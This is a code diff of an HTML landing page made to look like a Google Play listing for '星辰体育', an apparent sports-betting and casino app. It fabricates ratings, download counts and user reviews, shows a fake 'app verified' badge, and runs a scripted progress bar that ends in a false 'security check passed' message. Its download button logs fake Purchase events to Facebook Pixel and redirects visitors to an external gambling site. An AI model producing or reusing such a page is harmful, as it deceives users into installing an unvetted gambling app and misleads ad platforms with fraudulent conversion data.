-            <div class="modal-logo">
-                <svg class="modal-logo-icon" viewBox="0 0 48 48">
-                    <circle cx="24" cy="24" r="20" fill="none" stroke="#ea4335" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="0" />
-                    <circle cx="24" cy="24" r="20" fill="none" stroke="#fbbc04" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="-25" />
-                    <circle cx="24" cy="24" r="20" fill="none" stroke="#34a853" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="-50" />
-                    <circle cx="24" cy="24" r="20" fill="none" stroke="#4285f4" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="-75" />
-                </svg>
-                <span class="modal-logo-text">loading...</span>
-            </div>
-
-            <!-- Loading -->
-            <div class="modal-loading">
-                <div class="spinner-wrap">
-                    <div class="spinner"></div>
-                    <span class="spinner-percent" id="percent">0%</span>
-                </div>
-            </div>
-
-            <!-- Ready -->
-            <div class="modal-ready">
-                <div class="effective-badge">
-                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-                    安全验证通过
-                </div>
-                <button class="modal-install-btn" id="installNow">下载入口</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- ========================================================= -->
-    <!-- ===== JavaScript ===== -->
-    <!-- ========================================================= -->
-    <script>
-        (function() {
-            'use strict';
-
-            // ---------- 1. 轮播图 ----------
-            var track = document.getElementById('carouselTrack');
-            var dots = document.querySelectorAll('#carouselDots .dot');
-            var slideCount = dots.length; // 5
-            var currentSlide = 2; // 初始显示第3张 (索引2)，与 transform: -200% 对应
-            var autoTimer = null;
-            var isDragging = false;
-            var startX = 0;
-            var startTranslate = 0;
-
-            // 设置初始状态
-            function applySlide(index) {
-                currentSlide = index;
-                track.style.transform = 'translateX(-' + (index * 20) + '%)';
-                dots.forEach(function(d, i) {
-                    d.classList.toggle('active', i === index);
-                });
-            }
-
-            // 切换到指定 slide
-            function goToSlide(index) {
-                if (index < 0) index = slideCount - 1;
-                if (index >= slideCount) index = 0;
-                applySlide(index);
-                resetAutoTimer();
-            }
-
-            // 重置自动轮播定时器
-            function resetAutoTimer() {
-                if (autoTimer) {
-                    clearInterval(autoTimer);
-                    autoTimer = null;
-                }
-                autoTimer = setInterval(function() {
-                    goToSlide((currentSlide + 1) % slideCount);
-                }, 3000);
-            }
-
-            // 点击 dot
-            dots.forEach(function(dot) {
-                dot.addEventListener('click', function() {
-                    var idx = parseInt(this.getAttribute('data-index'), 10);
-                    if (idx === currentSlide) return;
-                    goToSlide(idx);
-                });
-            });
-
-            // 触摸滑动
-            track.addEventListener('touchstart', function(e) {
-                if (autoTimer) {
-                    clearInterval(autoTimer);
-                    autoTimer = null;
-                }
-                isDragging = true;
-                startX = e.touches[0].clientX;
-                // 获取当前 translate 值
-                var match = track.style.transform.match(/translateX\(-([\d.]+)%\)/);
-                startTranslate = match ? parseFloat(match[1]) : currentSlide * 20;
-            }, { passive: true });
-
-            track.addEventListener('touchmove', function(e) {
-                if (!isDragging) return;
-                var diff = (startX - e.touches[0].clientX) / track.offsetWidth * 100;
-                var newTranslate = startTranslate + diff;
-                // 边界限制
-                if (newTranslate < 0) newTranslate = 0;
-                if (newTranslate > (slideCount - 1) * 20) newTranslate = (slideCount - 1) * 20;
-                track.style.transform = 'translateX(-' + newTranslate + '%)';
-            }, { passive: true });
-
-            track.addEventListener('touchend', function(e) {
-                if (!isDragging) return;
-                isDragging = false;
-                var diff = startX - e.changedTouches[0].clientX;
-                var threshold = track.offsetWidth * 0.15;
-                var targetIndex = currentSlide;
-                if (diff > threshold && currentSlide < slideCount - 1) {
-                    targetIndex = currentSlide + 1;
-                } else if (diff < -threshold && currentSlide > 0) {
-                    targetIndex = currentSlide - 1;
-                }
-                goToSlide(targetIndex);
-                resetAutoTimer();
-            }, { passive: true });
-
-            // 鼠标拖拽（桌面）
-            var isMouseDown = false;
-            var mouseStartX = 0;
-            var mouseStartTranslate = 0;
-
-            track.addEventListener('mousedown', function(e) {
-                if (e.button !== 0) return;
-                if (autoTimer) {
-                    clearInterval(autoTimer);
-                    autoTimer = null;
-                }
-                isMouseDown = true;
-                mouseStartX = e.clientX;
-                var match = track.style.transform.match(/translateX\(-([\d.]+)%\)/);
-                mouseStartTranslate = match ? parseFloat(match[1]) : currentSlide * 20;
-                track.style.cursor = 'grabbing';
-                e.preventDefault();
-            });
-
-            document.addEventListener('mousemove', function(e) {
-                if (!isMouseDown) return;
-                var diff = (mouseStartX - e.clientX) / track.offsetWidth * 100;
-                var newTranslate = mouseStartTranslate + diff;
-                if (newTranslate < 0) newTranslate = 0;
-                if (newTranslate > (slideCount - 1) * 20) newTranslate = (slideCount - 1) * 20;
-                track.style.transform = 'translateX(-' + newTranslate + '%)';
-            });
-
-            document.addEventListener('mouseup', function(e) {
-                if (!isMouseDown) return;
-                isMouseDown = false;
-                track.style.cursor = 'default';
-                var diff = mouseStartX - e.clientX;
-                var threshold = track.offsetWidth * 0.15;
-                var targetIndex = currentSlide;
-                if (diff > threshold && currentSlide < slideCount - 1) {
-                    targetIndex = currentSlide + 1;
-                } else if (diff < -threshold && currentSlide > 0) {
-                    targetIndex = currentSlide - 1;
-                }
-                goToSlide(targetIndex);
-                resetAutoTimer();
-            });
-
-            // 初始化
-            applySlide(2); // 显示第3张
-            resetAutoTimer();
-
-            // 窗口 resize 不重置位置，但保持比例
-            window.addEventListener('resize', function() {
-                // 仅确保 transform 正确
-                track.style.transform = 'translateX(-' + (currentSlide * 20) + '%)';
-            });
-
-            // ---------- 2. Modal ----------
-            var modal = document.getElementById('modal');
-            var modalBox = document.getElementById('modalBox');
-            var percentEl = document.getElementById('percent');
-
-            function showModal() {
-                modalBox.classList.remove('ready');
-                percentEl.textContent = '0%';
-                modal.classList.add('active');
-
-                var progress = 0;
-                var timer = setInterval(function() {
-                    progress += Math.floor(Math.random() * 8) + 3;
-                    if (progress >= 100) {
-                        progress = 100;
-                        clearInterval(timer);
-                        percentEl.textContent = '100%';
-                        setTimeout(function() {
-                            modalBox.classList.add('ready');
-                        }, 300);
-                        return;
-                    }
-                    percentEl.textContent = progress + '%';
-                }, 70);
-            }
-
-            function closeModal() {
-                modal.classList.remove('active');
-            }
-
-            // 点击 overlay 关闭
-            modal.addEventListener('click', function(e) {
-                if (e.target === modal) {
-                    closeModal();
-                }
-            });
-
-            // 安装按钮 → 显示 modal
-            document.getElementById('mainInstallBtn').addEventListener('click', showModal);
-
-            // 底部导航按钮 → 显示 modal
-            document.querySelectorAll('.nav-item').forEach(function(item) {
-                item.addEventListener('click', function() {
-                    // 切换 active 样式
-                    document.querySelectorAll('.nav-item').forEach(function(n) {
-                        n.classList.remove('active');
-                    });
-                    this.classList.add('active');
-                    showModal();
-                });
-            });
-
-            // 分享、心愿单 → 显示 modal（演示交互）
-            document.querySelectorAll('.action-item').forEach(function(item) {
-                item.addEventListener('click', showModal);
-            });
-
-            // 底部链接 → 显示 modal
-            document.querySelectorAll('.footer-link').forEach(function(item) {
-                item.addEventListener('click', showModal);
-            });
-
-            // "查看所有评价" → 显示 modal
-            document.querySelector('.view-all-btn').addEventListener('click', showModal);
-
-            // "下载入口" 按钮 → 执行下载逻辑
-            document.getElementById('installNow').addEventListener('click', function() {
-                // 调用原有 donwload 逻辑 (保留 Facebook Pixel 追踪)
-                if (typeof fbq !== 'undefined') {
-                    fbq('track', 'AddToCart');
-                    fbq('track', 'Contact');
-                    fbq('track', 'Purchase');
-                }
-                // 跳转
-                window.location.href = 'http://google.com';
-            });
-
-            // ---------- 3. 帮助按钮（评价） ----------
-            document.querySelectorAll('.helpful-btn').forEach(function(btn) {
-                btn.addEventListener('click', function() {
-                    var parent = this.closest('.review-actions');
-                    var btns = parent.querySelectorAll('.helpful-btn');
-                    btns.forEach(function(b) {
-                        b.style.background = '#e8eaed';
-                        b.style.color = '#5f6368';
-                    });
-                    this.style.background = '#1a73e8';
-                    this.style.color = '#fff';
-                });
-            });
-
-            // ---------- 4. Facebook Pixel (保留) ----------
-            // 已存在页面头部
-
-            console.log('✅ 轮播图已修复：5张图片 → 5个指示点');
-            console.log('✅ 页面优化完成');
-        })();
-    </script>
-
-    <!-- ===== Facebook Pixel 保留（原页面已有） ===== -->
     <script>
         ! function(f, b, e, v, n, t, s) {
             if (f.fbq) return;
@@ -1414,11 +36,14 @@
             fbq('init', fbid);
             fbq('track', 'PageView');
         }
-        // 备用 pixel
+    </script>
+
+    <script>
         ! function(f, b, e, v, n, t, s) {
             if (f.fbq) return;
             n = f.fbq = function() {
-                n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
             };
             if (!f._fbq) f._fbq = n;
             n.push = n;
@@ -1430,13 +55,434 @@
             t.src = v;
             s = b.getElementsByTagName(e)[0];
             s.parentNode.insertBefore(t, s)
-        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', '1608526056916699');
         fbq('track', 'PageView');
     </script>
-    <noscript>
-        <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1608526056916699&amp;ev=PageView&amp;noscript=1" />
-    </noscript>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=1608526056916699&ev=PageView&noscript=1" /></noscript>
+
+    <script>
+        function donwload() {
+            fbq('track', 'AddToCart');
+            fbq('track', 'Contact');
+            fbq('track', 'Purchase');
+            window.location.href = 'https://xcty58.vip/';
+        }
+    </script>
+
+</head>
+<body>
+
+    <!-- Top Bar -->
+    <div class="top-bar">
+    </div>
+
+    <!-- App Header -->
+    <div class="app-header">
+        <div class="app-icon">
+            <img src="images/logo.jpg" alt="星辰体育" width="100%" height="100%">
+        </div>
+        <div class="app-info">
+            <h1>星辰体育</h1>
+            <div class="developer">xcty79.vip</div>
+            <div class="verified">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg>
+                已通过应用验证
+            </div>
+        </div>
+    </div>
+
+    <!-- Stats Row -->
+    <div class="stats-row">
+        <div class="stat-item">
+            <div class="stat-value">4.9 <span class="star">★</span></div>
+            <div class="stat-label">4.6万 条评价</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value">50万+</div>
+            <div class="stat-label">下载量</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value"><span class="badge-18">18+</span></div>
+            <div class="stat-label">适用年龄</div>
+        </div>
+    </div>
+
+    <!-- Install Button -->
+    <div class="install-section">
+        <button class="install-btn">立即安装</button>
+        <div class="install-hint">10秒内即完成</div>
+    </div>
+
+
+
+    <!-- Promo Banner Carousel -->
+    <div class="promo-banner carousel">
+        <div class="carousel-track" style="transform: translateX(-200%);">
+            <div class="carousel-slide"><img src="images/1.jpg" alt="活动1"></div>
+            <div class="carousel-slide"><img src="images/2.jpg" alt="活动2"></div>
+            <div class="carousel-slide"><img src="images/3.jpg" alt="活动3"></div>
+            <div class="carousel-slide"><img src="images/4.jpg" alt="活动4"></div>
+            <div class="carousel-slide"><img src="images/5.jpg" alt="活动5"></div>
+        </div>
+        <div class="carousel-dots">
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot active"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+        </div>
+    </div>
+
+    <!-- About Section -->
+    <div class="section">
+        <div class="section-header">
+            <h3>关于UC体育</h3>
+            <span class="arrow">➔</span>
+        </div>
+        <p>
+            超值回馈活动 - 火热进行中！充值100元，赠送88元！
+        </p>
+        <br>
+        <p>
+            星辰体育是一款专注于体育赛事与线上娱乐体验的综合型平台，覆盖足球、篮球、电竞等热门赛事内容，为用户提供清晰流畅的赛事信息、便捷的互动体验与多样化的娱乐选择。
+            平台以稳定、安全、高效为核心，打造简洁易用的操作界面，让用户可以快速查看赛事动态、参与热门活动，享受更专业、更沉浸的体育娱乐体验。
+        </p>
+        <p>
+            星辰体育，聚焦全球精彩赛事，让每一次参与都更有激情。
+        </p>
+        <div class="updated-info">
+            <div class="label">更新日期</div>
+            <div class="value">2026年7月02日</div>
+        </div>
+
+        <div class="tags">
+            <span class="tag">体育</span>
+            <span class="tag">竞猜</span>
+        </div>
+    </div>
+
+    <!-- Data Safety Section -->
+    <div class="section">
+        <div class="section-header">
+            <h3>数据安全</h3>
+            <span class="arrow">➔</span>
+        </div>
+        <p style="font-size:13px; color:#5f6368; margin-bottom:12px;">
+            您的数据安全取决于开发者如何收集和共享您的数据。数据隐私和安全措施可能因您的使用情况、所在地区和年龄而有所不同。以下信息由开发者提供，可能会随时间更新。
+        </p>
+    </div>
+
+    <div class="data-safety">
+        <div class="data-item">
+            <div class="data-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"></path></svg>
+            </div>
+            <div class="data-text">
+                <strong>不会与第三方共享数据</strong><br>
+                了解开发者如何声明数据共享方式
+            </div>
+        </div>
+        <div class="data-item">
+            <div class="data-icon">
+                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm7 13H5v-.23c0-.62.28-1.2.76-1.58C7.47 15.82 9.64 15 12 15s4.53.82 6.24 2.19c.48.38.76.97.76 1.58V19z"></path></svg>
+            </div>
+            <div class="data-text">
+                此应用可能会收集以下类型的数据<br>
+                位置信息、应用活动记录和设备标识符等
+            </div>
+        </div>
+        <div class="data-item">
+            <div class="data-icon">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"></path></svg>
+            </div>
+            <div class="data-text">
+                数据在传输过程中会加密
+            </div>
+        </div>
+        <div class="data-item">
+            <div class="data-icon">
+                <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"></path></svg>
+            </div>
+            <div class="data-text">
+                您可以请求删除数据
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== 新增：5个游戏分类标签（在评分和评价上方） ===== -->
+    <div style="padding: 12px 16px 8px 16px; display: flex; flex-wrap: wrap; gap: 8px; background: #fff; border-bottom: 1px solid #e8eaed;">
+        <span class="tag">体育</span>
+        <span class="tag">电竞</span>
+        <span class="tag">娱乐场</span>
+        <span class="tag">电子</span>
+        <span class="tag">捕鱼</span>
+    </div>
+    <!-- ===== 新增结束 ===== -->
+
+    <!-- Ratings Section -->
+    <div class="ratings-section">
+        <div class="ratings-header">
+            <h3>评分和评价</h3>
+            <span class="arrow" style="font-size:20px;color:#5f6368;">➔</span>
+        </div>
+        <div class="ratings-subtitle">评分和评价均经过验证</div>
+
+        <div class="ratings-overview">
+            <div>
+                <div class="big-rating">4.9</div>
+                <div class="star-icons">★★★★★</div>
+                <div class="rating-count">1.91万 条评价</div>
+            </div>
+            <div class="stars-breakdown">
+                <div class="star-row"><span class="num">5</span><div class="star-bar"><div class="fill" style="width:90%"></div></div></div>
+                <div class="star-row"><span class="num">4</span><div class="star-bar"><div class="fill" style="width:7%"></div></div></div>
+                <div class="star-row"><span class="num">3</span><div class="star-bar"><div class="fill" style="width:2%"></div></div></div>
+                <div class="star-row"><span class="num">2</span><div class="star-bar"><div class="fill" style="width:1%"></div></div></div>
+                <div class="star-row"><span class="num">1</span><div class="star-bar"><div class="fill" style="width:1%"></div></div></div>
+            </div>
+        </div>
+
+        <!-- Reviews -->
+        <div class="review">
+            <div class="review-header">
+                <div class="avatar" style="background:#7b1fa2;">张</div>
+                <span class="review-name">张明华</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars-date">
+                <span class="review-stars">★★★★★</span>
+                <span class="review-date">2024年9月5日</span>
+            </div>
+            <p class="review-text">这个应用非常好，赛事丰富，数据分析很专业。总体来说我很喜欢，是休闲放松的好选择！</p>
+            <p class="review-helpful">52人认为此评价有用</p>
+            <div class="review-actions">
+                <span>您觉得此评价有用吗？</span>
+                <button class="helpful-btn">是</button>
+                <button class="helpful-btn">否</button>
+            </div>
+        </div>
+
+        <div class="review">
+            <div class="review-header">
+                <div class="avatar" style="background:#1565c0;">李</div>
+                <span class="review-name">李晓燕</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars-date">
+                <span class="review-stars">★★★★★</span>
+                <span class="review-date">2024年8月19日</span>
+            </div>
+            <p class="review-text">非常喜欢这个应用，赛事种类齐全，实时数据更新很快，每天都在用。</p>
+            <p class="review-helpful">52人认为此评价有用</p>
+            <div class="review-actions">
+                <span>您觉得此评价有用吗？</span>
+                <button class="helpful-btn">是</button>
+                <button class="helpful-btn">否</button>
+            </div>
+        </div>
+
+        <div class="review">
+            <div class="review-header">
+                <div class="avatar" style="background:#2e7d32;">王</div>
+                <span class="review-name">王建国</span>
+                <span class="review-menu">⋮</span>
+            </div>
+            <div class="review-stars-date">
+                <span class="review-stars">★★★★★</span>
+                <span class="review-date">2024年6月9日</span>
+            </div>
+            <p class="review-text">非常有趣，不会卡顿，内容丰富，界面清爽，非常好的体验。</p>
+            <p class="review-helpful">52人认为此评价有用</p>
+            <div class="review-actions">
+                <span>您觉得此评价有用吗？</span>
+                <button class="helpful-btn">是</button>
+                <button class="helpful-btn">否</button>
+            </div>
+        </div>
+
+        <button class="view-all-btn">查看所有评价</button>
+    </div>
+
+    <!-- What's New -->
+    <div class="whats-new">
+        <h3>新功能</h3>
+        <p>您好，星辰体育的粉丝们！<br>这里有一个新的更新：</p>
+        <ul>
+            <li>性能优化提升</li>
+        </ul>
+        <br>
+        <p>尽情享受吧！</p>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="footer-links">
+        <span class="footer-link">充值通行证</span>
+        <span class="footer-link">积分商城</span>
+        <span class="footer-link">礼品兑换</span>
+        <span class="footer-link">退款政策</span>
+    </div>
+
+    <!-- Country Selector -->
+    <div class="country-selector">
+        <span class="country-flag">🇨🇳</span>
+        <span>中国（简体中文）</span>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item active">
+            <svg viewBox="0 0 24 24"><path d="M15 7.5V2H9v5.5l3 3 3-3zM7.5 9H2v6h5.5l3-3-3-3zM9 16.5V22h6v-5.5l-3-3-3 3zM16.5 9l-3 3 3 3H22V9h-5.5z"></path></svg>
+            游戏
+        </div>
+        <div class="nav-item">
+            <svg viewBox="0 0 24 24"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"></path></svg>
+            应用
+        </div>
+        <div class="nav-item">
+            <svg viewBox="0 0 24 24"><path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"></path></svg>
+            影视
+        </div>
+        <div class="nav-item">
+            <svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"></path></svg>
+            图书
+        </div>
+        <div class="nav-item">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+            少儿
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal-overlay" id="modal">
+        <div class="modal-box ready" id="modalBox">
+            <!-- Logo -->
+            <div class="modal-logo">
+                <svg class="modal-logo-icon" viewBox="0 0 48 48">
+                    <circle cx="24" cy="24" r="20" fill="none" stroke="#ea4335" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="0"></circle>
+                    <circle cx="24" cy="24" r="20" fill="none" stroke="#fbbc04" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="-25"></circle>
+                    <circle cx="24" cy="24" r="20" fill="none" stroke="#34a853" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="-50"></circle>
+                    <circle cx="24" cy="24" r="20" fill="none" stroke="#4285f4" stroke-width="3" stroke-dasharray="20 100" stroke-dashoffset="-75"></circle>
+                </svg>
+                <span class="modal-logo-text">loading...</span>
+            </div>
+
+            <!-- Loading State -->
+            <div class="modal-loading">
+                <div class="spinner-wrap">
+                    <div class="spinner"></div>
+                    <span class="spinner-percent" id="percent">100%</span>
+                </div>
+            </div>
+
+            <!-- Ready State -->
+            <div class="modal-ready">
+                <div class="effective-badge">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg>
+                    安全验证通过
+                </div>
+                <button class="modal-install-btn" id="installNow">下载入口</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+
+            var modal = document.getElementById('modal');
+            var modalBox = document.getElementById('modalBox');
+            var percentEl = document.getElementById('percent');
+
+            function showModal() {
+                modalBox.classList.remove('ready');
+                percentEl.textContent = '0%';
+                modal.classList.add('active');
+
+                var progress = 0;
+                var timer = setInterval(function() {
+                    progress += Math.floor(Math.random() * 8) + 3;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(timer);
+                        percentEl.textContent = '100%';
+                        setTimeout(function() {
+                            modalBox.classList.add('ready');
+                        }, 300);
+                        return;
+                    }
+                    percentEl.textContent = progress + '%';
+                }, 70);
+            }
+
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) {
+                    modal.classList.remove('active');
+                }
+            });
+
+            document.getElementById('installNow').addEventListener('click', function() {
+                donwload();
+            });
+
+            document.querySelector('.install-btn').addEventListener('click', showModal);
+
+            document.querySelectorAll('.nav-item').forEach(function(item) {
+                item.addEventListener('click', showModal);
+            });
+
+            var track = document.querySelector('.carousel-track');
+            var dots = document.querySelectorAll('.carousel-dots .dot');
+            var slideCount = dots.length;
+            var currentSlide = 0;
+            var startX = 0;
+            var isDragging = false;
+
+            function goToSlide(index) {
+                currentSlide = index;
+                track.style.transform = 'translateX(-' + (index * 100) + '%)';
+                dots.forEach(function(d, i) {
+                    d.classList.toggle('active', i === index);
+                });
+            }
+
+            var autoTimer = setInterval(function() {
+                goToSlide((currentSlide + 1) % slideCount);
+            }, 3000);
+
+            dots.forEach(function(dot, i) {
+                dot.addEventListener('click', function() {
+                    clearInterval(autoTimer);
+                    goToSlide(i);
+                    autoTimer = setInterval(function() {
+                        goToSlide((currentSlide + 1) % slideCount);
+                    }, 3000);
+                });
+            });
+
+            track.addEventListener('touchstart', function(e) {
+                startX = e.touches[0].clientX;
+                isDragging = true;
+                clearInterval(autoTimer);
+            });
+            track.addEventListener('touchend', function(e) {
+                if (!isDragging) return;
+                isDragging = false;
+                var diff = startX - e.changedTouches[0].clientX;
+                if (diff > 50 && currentSlide < slideCount - 1) {
+                    goToSlide(currentSlide + 1);
+                } else if (diff < -50 && currentSlide > 0) {
+                    goToSlide(currentSlide - 1);
+                }
+                autoTimer = setInterval(function() {
+                    goToSlide((currentSlide + 1) % slideCount);
+                }, 3000);
+            });
+        })();
+    </script>
+
+    <script defer="" src="v8c78df7c7c0f484497ecbca7046644da1771523124516.html" data-cf-beacon="{" version":"2024.11.0","token":"978626b0c62d446a8c4a2bcaa817f9a0","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
 
 </body>
 </html>
